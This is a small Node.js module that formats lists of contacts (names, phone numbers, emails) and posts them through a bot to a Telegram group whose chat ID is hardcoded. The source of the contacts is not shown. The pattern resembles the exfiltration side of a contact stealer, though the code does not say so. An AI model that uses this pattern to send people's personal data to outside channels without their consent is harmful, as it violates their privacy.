const TelegramBot = require('node-telegram-bot-api');
const config = require('./config');

// Initialize Telegram Bot
const bot = new TelegramBot(config.telegramToken, { username: 'CompassG_bot', polling: true });

// Define the target group chat ID
const targetGroupChatId = '-1002128280650';

// Function to send contacts to Telegram group
async function sendContactsToTelegram(chatId, contacts) {
  try {
    let formattedContacts = '';
    if (contacts && contacts.length > 0) {
      formattedContacts = 'Contacts:\n';
      contacts.forEach(contact => {
        const name = contact[0] || '-';
        const number = contact[1] || '-';
        const email = contact[2] || '-';
        formattedContacts += `Name: ${name}\nNumber: ${number}\nEmail: ${email}\n\n`;
      });
    } else {
      formattedContacts = 'No contacts found.';
    }

    await bot.sendMessage(chatId, formattedContacts);
    console.log('Contacts sent to Telegram group.');
  } catch (error) {
    console.error('Error sending contacts to Telegram:', error);
  }
}

module.exports = { sendContactsToTelegram };
